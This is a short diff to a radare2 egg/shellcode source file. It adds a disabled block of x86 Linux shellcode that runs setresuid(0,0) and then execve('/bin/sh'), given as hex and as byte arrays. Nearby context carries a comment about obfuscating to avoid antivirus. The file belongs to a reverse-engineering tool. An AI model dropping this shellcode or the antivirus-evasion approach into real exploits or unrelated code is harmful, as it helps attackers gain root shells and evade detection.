@@ -1,6 +1,17 @@
 /* radare - LGPL - Copyright 2011 pancake<@nopcode.org> */
 #include <r_egg.h>
 
+#if 0
+linux setresuid(0,0)+execv(/bin/sh)
+31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80
+
+SETRESUID: (11 bytes)
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"
+
+BINSH: (24 bytes) (x86-32/64):
+"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
+#endif
+
 // XXX: must obfuscate to avoid antivirus
 // OSX
 static ut8 x86_osx_suid_binsh[] =
